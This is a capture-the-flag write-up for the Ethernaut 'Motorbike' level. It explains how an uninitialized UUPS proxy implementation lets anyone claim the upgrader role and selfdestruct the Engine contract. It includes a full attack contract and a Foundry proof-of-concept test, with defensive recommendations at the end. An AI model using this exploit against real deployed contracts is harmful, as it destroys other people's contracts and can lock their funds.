# Level 25 - Motorbike

## Objectives

- `selfdestruct` Motorbike engine and make the motorbike unusable

## Contract Overview

Code consists of two contracts, `Motorbike` and `Engine`, which implement upgradeable proxy patterns. These contracts utilize the EIP-1967 Proxy Upgrade pattern to separate the contract's logic from its storage, allowing for contract upgrades without losing state data.

Contract `Motorbike` initializes the upgradeable proxy with an initial implementation specified by the `_logic` parameter.It stores the address of the current implementation in a predefined slot using EIP-1967 slot syntax. The `fallback` function delegates calls to the current implementation. It includes internal functions to delegate calls and retrieve address slots. This contract facilitates the upgradeable behavior and acts as a proxy for the `Engine` contract.

The `Engine` contract is the implementation contract managed by the `Motorbike` proxy. It implements an upgradeable engine functionality with an initial horse power of 1000. The initialize function sets the initial state variables such as `horsePower` and `upgrader`. The `upgradeToAndCall` function upgrades the implementation to a new version and executes a setup call if provided. It includes authorization checks to restrict upgrade capabilities to the `upgrader` role. The `_setImplementation` function stores a new implementation address in the EIP-1967 implementation slot.

It uses the UUPS proxy pattern, the contract upgrade mechanism is embedded within the implementation contract rather than the proxy contract. This design choice offers gas savings to the user. Here we have the presence of a storage slot in the proxy contract responsible for storing the address of the logic contract. Whenever the logic contract undergoes an upgrade, this storage slot is updated accordingly. This practice is implemented to prevent storage collision issues.

## Upgradeable Contracts

In Ethereum, every transaction is unchangeable and cannot be altered, providing a secure network that allows anyone to verify and validate transactions. However, this poses a challenge for developers who need to update their contract's code as it cannot be changed once deployed on the blockchain.

To address this issue, upgradeable contracts were introduced, which consist of two contracts - a Proxy contract (Storage layer) and an Implementation contract (Logic layer).

Under this architecture, users interact with the logic contract via the proxy contract. When there is a need to update the logic contract's code, the address of the logic contract is updated in the proxy contract, enabling users to interact with the new logic contract.

## Finding the weak spots

Upon examining the `Engine` contract, we notice the absence of a `selfdestruct()` function within its code. So to invoke it we have to upgrade the implementation contract, directing it to our deployed attacker contract.

To execute this upgrade, the `Engine` contract includes a function named `upgradeToAndCall()`:

```solidity
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

```

First it is calling `_authorizeUpgrade()` to verify whether the `msg.sender` is the `upgrader`.

```solidity
   function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

```

After that it is calling `_upgradeToAndCall(newImplementation, data)` where as `newImplementation` we can set our deployed attacker contract using as data our `selfdestruct()` function implemented in attacker contract.

That is why to execute a contract upgrade, we must ensure that we possess the `upgrader` role. How can we do this? Let's examine the `initialize()` function because in this function upgrader is set:

```solidity
    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

```

The `initialize()` function serves a crucial role in UUPS-based contracts, functioning akin to a constructor that can only be invoked once, as ensured by the `initializer` modifier. This ensures that critical initialization steps are performed precisely once, guarding against any unintended reinitialization.

It's worth noting a key aspect of this implementation: the `initialize()` function is expected to be triggered by the proxy contract, as evidenced by its invocation within the constructor. However, it's executed via a `delegatecall()`. When a contract invokes a `delegatecall` to another contract, the caller contract's storage slots are modified using the code of the called contract.

This implies that the `delegatecall()` occurs within the context of the proxy contract rather than the implementation contract. While it's true that the proxy contract can execute `initialize()` only once, in the context of the implementation contract, `initialize()` hasn't yet been called. That is why by calling `initialize()` in the context of the implementation contract we can effectively become the `upgrader`.

Once we assume the role of the `upgrader`, we gain the ability to invoke `upgradeToAndCall()` with attacker contract's address, wherein we can define a `selfdestruct()` function.

```solidity

```

## Plan of the attack

1. Creation of `MotorbikeAttack` contract - Attacker creates `MotorbikeAttack` contract providing the address of the `Engine` contract.
2. Calling the `attack()` function - Attacker calls the `attack()` function in the `MotorbikeAttack` contract.
3. Initialization of the `Engine` contract - The `initialize()` function in the `Engine` contract is called via `delegatecall`, allowing the attacker to initialize the contract and take over the `upgrader` role.
4. Upgrade of the `Engine` contract - the `upgradeToAndCall()` function in the Engine contract is called with the address of the attacker's `MotorbikeAttack` contract and the `destroy()` function as data. This function upgrades the `Engine` contract to a new implementation, enabling the execution of the `destroy()` function in the attacker's contract.
5. Calling the `destroy()` function - the `destroy()` function in the `MotorbikeAttack` contract is called, resulting in the selfdestruction of the contract and transferring the entire balance to the attacker's address.

## Malicious contract (MotorbikeAttack.sol)

```solidity
// SPDX-License-Identifier: MIT

import "./Motorbike.sol";
pragma solidity <0.7.0;

contract MotorbikeAttack {
    Engine victimContract;

    constructor(address _victimContract) public {
        victimContract = Engine(address(_victimContract));
    }

    function attack() public {
        // 3. Initialization of the `Engine` contract - The `initialize()` function in the `Engine` contract is called via `delegatecall`, allowing the attacker to initialize the contract and take over the `upgrader` role.
        victimContract.initialize();

        // 4. Upgrade of the `Engine` contract - the `upgradeToAndCall()` function in the Engine contract is called with the address of the attacker's `MotorbikeAttack` contract and the `destroy()` function as data. This function upgrades the `Engine` contract to a new implementation, enabling the execution of the `destroy()` function in the attacker's contract.
        victimContract.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
    }

    // 5. Calling the `destroy()` function - the `destroy()` function in the `MotorbikeAttack` contract is called, resulting in the selfdestruction of the contract and transferring the entire balance to the attacker's address.
    function destroy() public {
        selfdestruct(payable(address(this)));
    }

    fallback() external payable {}

    receive() external payable {}
}

```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/25-Motorbike.t.sol))

```solidity

        Engine engine = Engine(
            address(
                uint160(
                    uint256(
                        vm.load(
                            address(levelAddress),
                            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                        )
                    )
                )
            )
        );

        // 1. Creation of `MotorbikeAttack` contract - Attacker creates `MotorbikeAttack` contract providing the address of the `Engine` contract.
        MotorbikeAttack motorbikeAttack = new MotorbikeAttack(address(engine));

        emit log_named_address(
            "Address of attacker contract: ",
            address(motorbikeAttack)
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_address(
            "Address of the upgrader before attack: ",
            engine.upgrader()
        );

        // 2. Calling the `attack()` function - Attacker calls the `attack()` function in the `MotorbikeAttack` contract.
        motorbikeAttack.attack();

        emit log_named_address(
            "Address of the upgrader after attack: ",
            engine.upgrader()
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // Test assertion
        assertEq(engine.upgrader(), address(motorbikeAttack));

        // selfdestruct has no effect in test
        // https://github.com/foundry-rs/foundry/issues/1543
        vm.etch(address((engine)), hex"");
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Motorbike.png)

## Recommendations

- It's crucial to appreciate the significance of caller context, particularly concerning the storage of state variables. Mishandling the context could result in unintended modifications to critical contract data, potentially compromising the integrity and functionality of the system.

- Moreover, essential functions responsible for contract upgrades should be fortified with robust access control mechanisms. These safeguards ensure that only authorized entities possess the privilege to initiate critical operations, mitigating the risk of unauthorized modifications or manipulations to the contract's behavior and state.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
